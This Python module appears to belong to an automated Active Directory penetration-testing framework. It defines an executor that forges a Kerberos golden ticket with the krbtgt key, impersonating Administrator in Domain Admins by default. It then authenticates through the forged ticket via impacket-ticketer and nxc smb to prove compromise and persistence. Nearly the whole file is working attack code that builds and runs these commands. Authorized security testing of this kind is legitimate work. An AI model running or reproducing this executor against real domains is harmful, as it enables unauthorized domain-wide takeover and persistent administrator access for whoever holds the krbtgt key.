"""GOLDEN-TICKET validation executor -- T4 (Kerberos ticket forging).

Forge a TGT for any principal (default Administrator, RID 500, in Domain Admins
RID 512) with the krbtgt key, then authenticate THROUGH the forged ccache:

    impacket-ticketer -aesKey/-nthash <krbtgt> -domain-sid <SID> -domain <d>
                      -user-id 500 -groups 512 <user>                 (forge)
    KRB5CCNAME=<ccache> nxc smb <fqdn> --use-kcache --kdcHost <dc>     (= the terminal)

Non-mutating (the ticket is forged offline and used read-only): no rollback. The
krbtgt key is a SECRET -- it is NEVER a ParamSpec (comes from the threaded KRBTGT
capability in a chain, or ``cfg.forge_key`` standalone), rides ``-aesKey``/
``-nthash`` so ``redact_argv`` masks it, and is never written to a receipt. The
terminal proof is a VERIFIED forged-ccache login (``from ccache (Pwn3d!)``), never
the forge tool's exit code. ``verified_recipe=True`` (lab-proven on GOAD
27NOV2026: forged-ccache login scored *proved* by ad-lab-harness, secret-clean).
"""
from __future__ import annotations

from pathlib import Path

from ..recommend import ParamSpec, values
from .. import proof, states
from .base import (ValidationExecutor, ExecutorContext, Capability,
                   CAP_PRINCIPAL, CAP_AES_KEY, CAP_NT_HASH)
from .forge_common import (signing_key, key_flag, valid_key, resolve_domain_sid,
                           forge_and_reauth)


class GoldenTicketExecutor(ValidationExecutor):
    technique = "GOLDEN-TICKET"
    technique_class = "kerberos_forge"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True         # lab-proven on GOAD 27NOV2026 (forge+reauth, scored proved, secret-clean)
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_PERSISTENCE})
    recipe_ref = ("T4 GOLDEN = impacket-ticketer -aesKey/-nthash <krbtgt> -domain-sid <SID> "
                  "-domain <d> -user-id 500 -groups 512 <user> ; nxc --use-kcache reauth "
                  "(terminal = forged-ccache login Pwn3d) (recipe pinned in-lab)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx, finding):
        e = finding.entity or {}
        return [
            ParamSpec(name="forged_user", kind="free",
                      description="Principal the forged TGT impersonates.",
                      recommended=e.get("forged_user") or "Administrator",
                      rationale="A golden ticket impersonates any principal; Administrator by default."),
            ParamSpec(name="groups", kind="free",
                      description="Comma-separated group RIDs embedded in the ticket.",
                      recommended=e.get("groups") or "512",
                      rationale="512 = Domain Admins."),
            ParamSpec(name="user_id", kind="free",
                      description="RID of the forged user.",
                      recommended=e.get("user_id") or "500",
                      rationale="500 = built-in Administrator."),
            ParamSpec(name="domain_sid", kind="free",
                      description="Domain SID (auto-resolved via lookupsid if omitted).",
                      recommended=e.get("domain_sid") or "",
                      rationale="Resolved from the configured DC when not supplied.", required=False),
            ParamSpec(name="reauth_target", kind="target_host",
                      description="FQDN of a domain host to authenticate against with the forged ticket.",
                      recommended=e.get("reauth_target") or finding.host or "",
                      rationale="Any domain-joined host accepts a valid golden ticket.",
                      required=True),
        ]

    def target_identity(self, ctx, finding, params):
        forged = params["forged_user"].value if "forged_user" in params else "Administrator"
        return {"domain": ctx.config.domain, "principal": forged}

    def steps_preview(self, ctx, finding, params):
        v = values(params)
        return [
            f"impacket-ticketer <key-flag> *** -domain-sid {v.get('domain_sid') or '<auto>'} "
            f"-domain {ctx.config.domain} -user-id {v['user_id']} -groups {v['groups']} {v['forged_user']}",
            f"nxc smb {v['reauth_target']} --use-kcache --kdcHost {ctx.config.dc_ip}  (= the terminal proof)",
        ]

    # ---------------------------------------------------------------- composition (C)
    def chain_pre(self, ctx, finding):
        return frozenset({states.KRBTGT})

    def chain_eff(self, ctx, finding):
        return frozenset({states.S_PERSISTENCE})

    def accepts_key(self, ctx, finding, cap):
        return (cap.channel in (CAP_AES_KEY, CAP_NT_HASH)
                and valid_key(cap.value, "aes" if cap.channel == CAP_AES_KEY else "nt"))

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params) -> dict:
        cfg = ctx.config
        v = values(params)
        out_dir = Path(ctx.output_dir)
        steps: list = []
        errors: list = []
        gate = {"classifier": "not_required", "op": None}

        sid = resolve_domain_sid(ctx, v.get("domain_sid") or None)
        if not sid:
            errors.append("domain_sid_unresolved")
            return self._artifact(steps, gate, None, False, errors)

        key, kind = signing_key(ctx)
        if not valid_key(key, kind):
            errors.append("no_signing_key")
            return self._artifact(steps, gate, None, False, errors)

        forged = v["forged_user"]
        forge_argv = ["impacket-ticketer", key_flag(kind), key, "-domain-sid", sid,
                      "-domain", cfg.domain, "-user-id", v["user_id"],
                      "-groups", v["groups"], forged]
        ok, fsteps, ferrors = forge_and_reauth(ctx, forge_argv, forged, v["reauth_target"], out_dir,
                                               expect_principal=forged)
        steps += fsteps
        errors += ferrors

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=ok, impersonated=forged,
            predicate=(f"forged a golden TGT impersonating {forged} in {cfg.domain} with the "
                       "krbtgt key and authenticated through the forged ccache"),
            proof_token=proof.proof_token("GOLDEN-TICKET", cfg.domain, forged,
                                          "authn_success" if ok else "authn_failed"),
            extra={"forged_user": forged},
        )
        return self._artifact(steps, gate, terminal_fact, ok, errors)

    def produced(self, ctx, finding, params, artifact):
        if not artifact.get("complete"):
            return []
        forged = params["forged_user"].value
        # PUBLIC marker only (the forged identity) -- never the key or the ccache.
        return [Capability(state=states.S_PERSISTENCE, channel=CAP_PRINCIPAL,
                           value=forged, principal=forged)]

    @staticmethod
    def _artifact(steps, gate, terminal_fact, complete, errors):
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": {"applied": False,
                             "rollback": {"performed": False, "verified": True, "method": None}},
                "terminal_fact": terminal_fact, "complete": complete, "errors": errors}
